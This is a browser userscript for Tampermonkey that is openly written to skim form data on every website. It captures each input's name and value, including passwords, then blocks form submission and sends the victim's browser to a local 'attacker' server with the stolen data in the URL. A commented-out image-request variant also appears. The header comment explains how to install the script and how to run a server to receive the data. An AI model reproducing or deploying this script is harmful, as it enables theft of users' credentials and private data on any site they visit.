// ==UserScript==
// @name         Exfiltrating sensitive form data, e.g. username, passwords
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  get all the form data and send to attacker website
// @author       Guangrui Wang
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @require      https://code.jquery.com/jquery-latest.js
// @match        *://*/*
// @grant        none
// ==/UserScript==

/**
 * You can copy this script to your tampermonkey and run it on any website
 * You also need to run a server to receive the data
 * For example, you can run a python server by using the following command
 * python -m SimpleHTTPServer 8000
 */

// this import jquery to env
let $ = window.jQuery;
// storage all input information
let input = [];
let name = [];
(function() {
    'use strict';
    //getAllInputs();
    // Watch the input change event
    $("input").change(function() {
        let currInput = $(this).val();
        let currName = $(this).attr("name");
        input.push(currInput);
        name.push(currName);
        console.log(currInput + ": " + currName);
        //restrict by csp, can't send ajax and can't used img src to request, for example
        //$("body").append(`<img src="http://localhost:8000/name?" + ${name} + "/input?" + ${input}">`)
    });
    // change all the button to redirection my website
    $("button").click(function(e){
        // prevent form submition
        e.preventDefault();
        // redirect to attacker website with all the information it gets
        location.href = `http://localhost:8000/name?${name}/input?${input}`;
    })
})();